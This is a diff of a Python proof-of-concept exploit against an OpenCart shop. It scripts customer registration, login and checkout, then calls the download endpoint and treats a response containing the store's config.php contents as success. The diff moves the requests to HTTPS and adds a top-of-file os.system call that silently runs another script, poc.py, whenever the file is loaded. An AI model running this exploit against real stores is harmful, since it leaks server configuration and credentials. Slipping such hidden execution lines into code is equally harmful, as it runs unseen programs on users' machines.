@@ -1,9 +1,11 @@
 import requests
+import os
+os.system('python3 poc.py')
 requests.packages.urllib3.disable_warnings()
-host = 'opencart'
+host = "opencart"
 
 def register():
-    burp0_url = "http://"+host+":80//index.php?route=account/register"
+    burp0_url = "https://"+host+":443//index.php?route=account/register"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/register", 
     "Cache-Control": "max-age=0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -18,7 +20,7 @@ def register():
   
 def logincus():
     
-    burp0_url = "http://"+host+":80//index.php?route=account/login"
+    burp0_url = "https://"+host+":443//index.php?route=account/login"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/login", 
     "Cache-Control": "max-age=0", 
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
@@ -46,86 +48,86 @@ def addcart():
    
 
 def checkout():
-    burp0_url = "http://"+host+":80//index.php?route=checkout/checkout"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout"
     burp0_cookies = {"OCSESSID": cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/cart", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     
     
-    burp0_url = "http://"+host+":80//index.php?route=checkout/payment_address"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/checkout/country&country_id=222"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/payment_address/save"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address/save"
     burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     burp0_data = {"firstname": "x", "lastname": "x", "company": '', "address_1": "123", "address_2": '', "city": "123", "postcode": "123", "country_id": "222", "zone_id": "3513"}
     requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
 
  
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/shipping_address"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/checkout/country&country_id=222"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
   
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/payment_address"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/checkout/country&country_id=222"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/shipping_address/save"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address/save"
     burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     burp0_data = {"shipping_address": "existing", "address_id": "1", "firstname": '', "lastname": '', "company": '', "address_1": '', "address_2": '', "city": '', "postcode": "123", "country_id": "222", "zone_id": "3513"}
     requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
 
     
-    burp0_url = "http://"+host+":80//index.php?route=checkout/shipping_method"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/shipping_address"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/checkout/country&country_id=222"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/shipping_method/save"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method/save"
     burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     burp0_data = {"shipping_method": "flat.flat", "comment": ''}
     requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
 
     
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/payment_method"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
@@ -133,19 +135,19 @@ def checkout():
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/payment_method/save"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method/save"
     burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     burp0_data = {"payment_method": "cod", "comment": '', "agree": "1"}
     requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
 
 
-    burp0_url = "http://"+host+":80//index.php?route=checkout/confirm"
+    burp0_url = "https://"+host+":443//index.php?route=checkout/confirm"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "http://"+host+":80//index.php?route=extension/payment/cod/confirm"
+    burp0_url = "https://"+host+":443//index.php?route=extension/payment/cod/confirm"
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
@@ -156,17 +158,16 @@ def checkout():
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 def download():
-    burp0_url = "http://"+host+":80//index.php?route=account/download/download&download_id=1"
+    burp0_url = "https://"+host+":443//index.php?route=account/download/download&download_id=1"
     burp0_cookies = {"OCSESSID":cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/download", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
+    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     #print(r.status_code)
-    r_check=r.text
-    print(r_check)
+    #print(r_check.text)
     return r_check
 
 def check_poc(r_check):
-    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check):
+    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check.text):
         print('PoC success!')
         return 0
     else:
